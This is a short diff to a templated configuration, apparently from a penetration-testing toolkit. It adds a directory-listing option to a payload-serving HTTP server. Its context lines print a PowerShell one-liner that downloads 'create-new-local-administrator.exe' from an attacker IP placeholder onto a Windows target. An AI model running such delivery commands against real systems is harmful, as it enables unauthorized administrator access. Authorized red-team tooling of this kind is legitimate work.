@@ -11,4 +11,4 @@ content: |
   echo '                      -----PowerShell-----                      '; \
   echo 'Deliver only (x64): iwr -uri http://<%=$(esh variables/attacker_ip)%>:<%=$(esh variables/delivery_outbound_port)%>/create-new-local-administrator.exe -Outfile <%=$(esh variables/delivery_path_windows)%>\create-new-local-administrator.exe'; \
   echo '================================================================'; \
-  python -m <%=$(esh variables/templates_dir)%>/helper_scripts/startEnhancedHttpServer.py <%=$(esh variables/delivery_outbound_port)%> -d packstation/outbound
+  python -m <%=$(esh variables/templates_dir)%>/helper_scripts/startEnhancedHttpServer.py <%=$(esh variables/delivery_outbound_port)%> -d packstation/outbound <%=$(esh variables/delivery_dir_listing)%>
